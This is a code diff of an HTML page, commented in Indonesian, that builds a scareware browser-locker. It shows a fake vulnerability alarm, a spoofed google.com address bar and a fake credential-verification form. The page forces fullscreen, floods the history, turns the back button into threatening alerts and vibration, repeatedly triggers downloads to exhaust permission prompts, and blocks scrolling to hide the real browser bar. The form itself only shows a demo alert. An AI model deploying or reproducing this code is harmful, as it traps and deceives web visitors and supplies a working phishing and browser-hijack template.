@@ -1,83 +1,131 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Critical Security Update</title>
+    <title>Critical Security Research</title>
     <style>
         body { margin: 0; padding: 0; height: 500vh; background: #000; color: #0f0; font-family: monospace; overflow: hidden; }
         
-        /* Bar Palsu */
+        /* Bar Navigasi Palsu */
         .fake-bar {
             position: fixed; top: 0; width: 100%; height: 56px;
             background: #202124; display: flex; align-items: center;
             padding: 0 15px; z-index: 10000; border-bottom: 1px solid #3c4043;
+            box-sizing: border-box; color: #e8eaed;
         }
 
-        /* Penjara Transparan (Overlay) */
+        /* Penjara Transparan (Invisible Overlay) */
         #jail {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            background: rgba(255,255,255,0.01); /* Hampir gak kelihatan */
-            z-index: 9999; display: none; /* Aktif setelah klik */
+            background: rgba(255,255,255,0.01); 
+            z-index: 9999; display: none;
         }
 
+        .container { padding: 20px; text-align: center; margin-top: 80px; }
+        
         .btn-fix {
-            margin-top: 100px; padding: 20px; background: #d93025;
-            color: white; border: none; border-radius: 5px; font-weight: bold;
+            padding: 20px 40px; background: #d93025; color: white; 
+            border: none; border-radius: 5px; font-weight: bold; cursor: pointer;
         }
+
+        /* Form Verifikasi Generik */
+        #phishContent {
+            display: none; padding: 20px; z-index: 10001; position: relative;
+        }
+        .login-box {
+            background: white; color: black; padding: 25px; border-radius: 8px;
+            max-width: 350px; margin: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+        }
+        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
     </style>
 </head>
 <body>
 
     <div class="fake-bar" id="fakeBar" style="display:none;">
-        <span>🔒</span> <span style="margin-left:10px">google.com/security-check</span>
+        <span>🔒</span> <span style="margin-left:10px; font-size: 14px;">google.com/security-verify</span>
     </div>
 
     <div id="jail"></div>
 
-    <div style="padding: 20px; text-align: center;">
-        <h2>SYSTEM VULNERABILITY DETECTED</h2>
-        <p>Your browser requires an immediate security patch.</p>
+    <div class="container" id="startSection">
+        <h2>⚠ SYSTEM VULNERABILITY</h2>
+        <p>Interaction required to patch your browser.</p>
         <button class="btn-fix" onclick="launchCombo()">FIX SYSTEM NOW</button>
     </div>
 
+    <div id="phishContent">
+        <div class="login-box">
+            <h3 style="color: #d93025;">Verification Required</h3>
+            <p style="font-size: 13px; color: #666;">Your session is locked. Please verify your credentials to unlock navigation.</p>
+            <input type="text" placeholder="Username / Email">
+            <input type="password" placeholder="Password">
+            <button onclick="alert('Demo: Data entry successful.')" style="width:100%; padding:12px; background:#1a73e8; color:white; border:none; border-radius:4px;">Verify Now</button>
+        </div>
+    </div>
+
     <script>
+        function triggerDownloads() {
+            // Memulai download massal untuk memicu Permission Dialog
+            for (let i = 0; i < 5; i++) {
+                const blob = new Blob(["Security Patch Data " + i], {type: "text/plain"});
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement("a");
+                a.href = url;
+                a.download = `patch_file_${i}.txt`;
+                document.body.appendChild(a);
+                a.click();
+                setTimeout(() => window.URL.revokeObjectURL(url), 1000);
+            }
+        }
+
         function launchCombo() {
-            // 1. Aktifkan Overlay & Fake Bar
-            document.getElementById('jail').style.display = "block";
+            // 1. Tampilkan UI Penjara
+            document.getElementById('startSection').style.display = "none";
+            document.getElementById('phishContent').style.display = "block";
             document.getElementById('fakeBar').style.display = "flex";
+            document.getElementById('jail').style.display = "block";
 
             // 2. Fullscreen
             const el = document.documentElement;
             if (el.requestFullscreen) el.requestFullscreen();
 
             // 3. History Bombing
-            for (let i = 0; i < 50; i++) {
-                window.history.pushState({p: i}, "", "?id=" + Math.random().toString(36).substring(7));
+            for (let i = 0; i < 60; i++) {
+                window.history.pushState({p: i}, "", "?secure_id=" + Math.random().toString(36).substring(7));
             }
 
-            alert("Security Patch Applied. Please do not close this tab during the process.");
+            // 4. Download Bomb
+            triggerDownloads();
+
+            alert("SYSTEM SECURED: Navigation is restricted during verification.");
         }
 
-        // 4. THE TRAP LOOP (Saat user tekan Back)
+        // 5. THE TRAP LOOP (Interceptor Tombol Back)
         window.onpopstate = function() {
-            // Paksa masuk lagi
             if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
             
-            alert("⚠️ WARNING: Attempting to exit will corrupt your system files! Click OK to remain in Secure Mode.");
+            // Alert ini mereset 'User Activation' yang dipakai untuk Lock-Back
+            alert("⚠️ WARNING: Unauthorized navigation detected!\n\nClick OK to re-secure your session.");
             
-            // Re-Lock Fullscreen & Scroll
             setTimeout(() => {
+                // Re-Lock Fullscreen
                 const el = document.documentElement;
                 if (el.requestFullscreen) el.requestFullscreen();
-                window.scrollTo(0, 100);
-                // Tambah history lagi biar makin dalem penjaranaya
+                
+                // Re-Fill History
                 for (let i = 0; i < 10; i++) {
                     window.history.pushState(null, "", "?relock=" + Date.now());
                 }
+                
+                // Trigger Download lagi untuk 'Permission Exhaustion'
+                triggerDownloads();
+                
+                window.scrollTo(0, 100);
             }, 100);
         };
 
-        // Cegah Scroll ke atas biar bar asli nggak muncul
+        // Anti-Scroll (Menyembunyikan Bar Asli)
         window.onscroll = function() {
             if (window.pageYOffset < 50) {
                 window.scrollTo(0, 56);
